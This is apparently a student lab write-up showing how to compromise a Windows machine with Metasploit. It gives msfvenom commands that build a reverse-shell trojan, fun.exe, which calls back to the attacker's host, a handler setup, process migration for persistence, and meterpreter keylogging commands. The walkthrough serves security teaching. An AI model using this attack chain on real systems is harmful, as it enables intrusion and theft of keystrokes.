# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="672" height="366" alt="Screenshot 2026-02-17 194226" src="https://github.com/user-attachments/assets/14b7f315-5ad1-4b99-ae52-29cf5b910ddf" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="863" height="145" alt="Screenshot 2026-02-17 194257" src="https://github.com/user-attachments/assets/4be90995-f81e-45f1-b8aa-cf9078a15338" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="329" height="35" alt="Screenshot 2026-02-17 194314" src="https://github.com/user-attachments/assets/7908b728-ef31-4e21-aa6d-a7115f63e27c" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="315" height="48" alt="Screenshot 2026-02-17 194326" src="https://github.com/user-attachments/assets/fa35af33-83fd-4c45-9b27-3ee35d7623e6" />


Check the status of apache2
## OUTPUT:
<img width="930" height="413" alt="Screenshot 2026-02-17 194336" src="https://github.com/user-attachments/assets/fdcf5fcf-f620-4103-b103-26cf80a1aa22" />



Invoke msfconsole:
## OUTPUT:
<img width="640" height="521" alt="Screenshot 2026-02-17 194353" src="https://github.com/user-attachments/assets/432e8cd7-3b58-4f59-abb0-cbf4510a8809" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="930" height="226" alt="Screenshot 2026-02-17 194412" src="https://github.com/user-attachments/assets/f5d6ebc1-159a-4106-b127-d05f83a3d8ec" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="930" height="226" alt="Screenshot 2026-02-17 194412" src="https://github.com/user-attachments/assets/e86468ca-bb04-4b11-a33c-ca47f9a34c59" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="715" height="336" alt="image" src="https://github.com/user-attachments/assets/a8d51a9b-0927-4834-bcd7-e1f8e9426e8a" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="801" height="596" alt="Screenshot 2026-02-17 194720" src="https://github.com/user-attachments/assets/8eec3eba-b108-4a4f-9d64-b108e13f841a" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="936" height="89" alt="Screenshot 2026-02-17 194732" src="https://github.com/user-attachments/assets/87cc1fc0-9969-4c53-91b8-2e103304d2aa" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="942" height="837" alt="Screenshot 2026-02-17 194752" src="https://github.com/user-attachments/assets/6cf266ce-f69d-4479-9881-71e9d59e143c" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:
migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="960" height="800" alt="Screenshot 2026-02-17 194809" src="https://github.com/user-attachments/assets/e6b56823-4b97-471f-aaac-b45ed36e966a" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="319" height="44" alt="Screenshot 2026-02-17 194817" src="https://github.com/user-attachments/assets/e305dd94-cf89-42d3-9fd4-e10f5d8b048f" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="437" height="129" alt="Screenshot 2026-02-17 194900" src="https://github.com/user-attachments/assets/7dfa74c2-22f4-4c33-8e17-50bbc0c2bf0a" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
